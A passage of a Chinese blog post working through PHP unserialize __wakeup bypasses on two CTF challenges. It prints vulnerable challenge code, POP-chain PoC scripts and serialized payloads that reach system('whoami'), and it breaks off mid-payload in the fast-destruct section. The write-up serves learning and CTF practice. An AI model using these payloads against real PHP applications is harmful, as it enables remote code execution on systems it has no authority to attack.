href="#所有PHP内置实现serializable接口的类" class="headerlink" title="所有PHP内置实现serializable接口的类"></a>所有PHP内置实现serializable接口的类</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();<span class="comment">//获取已定义的所有的类</span></span><br><span class="line"><span class="variable">$serializationclasses</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">    <span class="variable">$reflact</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$class</span>);<span class="comment">//创建反射类对象</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$reflact</span>-&gt;<span class="title function_ invoke__">implementsInterface</span>(<span class="string">&#x27;serializable&#x27;</span>))&#123;<span class="comment">//判断类是否实现了serializable接口</span></span><br><span class="line">        <span class="variable">$serializationclasses</span>[] = <span class="variable">$class</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$serializationclasses</span> <span class="keyword">as</span> <span class="variable">$serializationclass</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$serializationclass</span>.PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241016143723770.png" alt="image-20241016143723770"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>利用上面讲到的写一个类试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Aaa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;zhang&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>();</span><br><span class="line"><span class="variable">$A</span>-&gt;a = <span class="keyword">new</span> <span class="title class_">Aaa</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="number">11</span>:<span class="string">&quot;ArrayObject&quot;</span>:<span class="number">66</span>:&#123;x:i:<span class="number">0</span>;a:<span class="number">0</span>:&#123;&#125;;m:a:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Aaa&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;zhang&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后再反序列看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Aaa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;zhang&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;construct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$A = new ArrayObject();</span></span><br><span class="line"><span class="comment">//$A-&gt;a = new Aaa();</span></span><br><span class="line"><span class="comment">//echo serialize($A);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;C:11:&quot;ArrayObject&quot;:66:&#123;x:i:0;a:0:&#123;&#125;;m:a:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Aaa&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;zhang&quot;;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wakeup</span><br><span class="line">destruct</span><br></pre></td></tr></table></figure><p>这里会发现wakeup还是一样的执行了，所以这种C绕过应该是对于ctf中绕过一些过滤方式而不是直接绕过wakeup方法的执行。</p><h4 id="例题-ctfshow愚人杯-easy-php"><a href="#例题-ctfshow愚人杯-easy-php" class="headerlink" title="例题 ctfshow愚人杯 easy_php"></a>例题 ctfshow愚人杯 easy_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单分析一下，很明显要在destruct中执行我们的命令，这里看到wakeup直接die掉，其实不影响destruct的执行，我们可以试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;111&#x27;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = new ctfshow();</span></span><br><span class="line"><span class="comment">//$a-&gt;ctfshow = &#x27;whoami&#x27;;</span></span><br><span class="line"><span class="comment">//echo serialize($a);//O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241016144734685.png" alt="image-20241016144734685"></p><p>因为在程序die之后，类的调用结束，进入回收机制会自动调用destruct，所以这里不用考虑如何绕过wakeup，考虑的是对请求参数过滤的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表达式中，用于匹配O或a开头的并且后面跟着一个或多个数字的字符，并且无法使用+绕过开头的判断，所以就需要用到上面说到的。payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>();</span><br><span class="line"><span class="variable">$A</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$A</span>-&gt;a-&gt;ctfshow = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);</span><br></pre></td></tr></table></figure><p>得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;C:11:&quot;ArrayObject&quot;:74:&#123;x:i:0;a:0:&#123;&#125;;m:a:1:&#123;s:1:&quot;a&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241016150309015.png" alt="image-20241016150309015"></p><blockquote><p>注：这里有个比较坑的点就是我用在线编译环境去执行poc，序列化结果是O对象类型，当时以为是自己poc问题改了好久最后本地执行之后才知道是在线编译环境有问题</p></blockquote><h3 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast-destruct"></a>fast-destruct</h3><p>本质上就是GC回收机制</p><h4 id="例题-NewStarCTF-2023-week4-More-Fast"><a href="#例题-NewStarCTF-2023-week4-More-Fast" class="headerlink" title="例题 [NewStarCTF 2023 week4] More Fast"></a>例题 [NewStarCTF 2023 week4] More Fast</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure><p>分析一下：</p><ol><li>利用点在web类的evil函数里面，找一下哪里能调用evil函数的</li><li>在Pwn类里面存在调用evil函数的地方，<code>public function __invoke()&#123;     $this-&gt;obj-&gt;evil(); &#125;</code>，找一下哪里可以调用__invoke方法的</li><li>__invoke方法在以函数方式调用类对象时候触发，这里可以在Re类和Start类调用，但是Start类调用之后没办法进入下一步，只能在Re类进行调用，</li><li>__get方法在调用类中不存在的变量时会被调用，找一下可以在crypto类中实现</li><li>__tostring方法在以字符串形式调用类对象时调用，可以在start类中实现</li></ol><p>所以完整的利用链应该是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start-&gt;crypto-&gt;reverse-&gt;pwn-&gt;web</span><br></pre></td></tr></table></figure><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$this</span>-&gt;<span class="keyword">var</span>)) &#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = @unserialize($_POST[&#x27;fast&#x27;]);</span></span><br><span class="line"><span class="comment">//throw new Exception(&quot;Nope&quot;);</span></span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;<span class="keyword">var</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;obj = <span class="variable">$w</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$r</span>-&gt;func = <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;obj = <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;errMsg = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241018100743495.png" alt="image-20241018100743495"></p><p>但是因为最后存在<code>throw new Exception(&quot;Nope&quot;);</code>，在类执行完毕之后无法进入destruct方法进行回收，所以这时候就需要用到fast-destruct方法，上面也说到了本质上就是GC回收机制。</p><p>方法有两种，删除末尾的花括号、数组对象占用指针（改数字）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//正常payload：</span></span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;errMsg&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;Crypto&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;Reverse&quot;</span>:<span class="number">1</span>:&#123;s:<span 